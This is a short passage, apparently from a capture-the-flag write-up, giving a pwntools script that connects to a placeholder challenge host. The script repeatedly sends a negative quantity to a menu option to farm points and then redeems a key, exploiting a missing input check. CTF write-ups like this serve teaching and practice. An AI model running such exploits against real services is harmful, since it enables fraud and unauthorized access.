5) Quick pwntools exploit :


from pwn import *

r = remote("<HOST>", 1337)

def confess_member_insult(qty):
    r.recvuntil(b"Choose an option:")
    r.sendline(b"2")
    r.recvuntil(b"confess?")
    r.sendline(str(qty).encode())

# farm points
for _ in range(5):
    confess_member_insult(-50)

# redeem key
r.recvuntil(b"Choose an option:")
r.sendline(b"3")

print(r.recvall(timeout=2).decode(errors="ignore"))

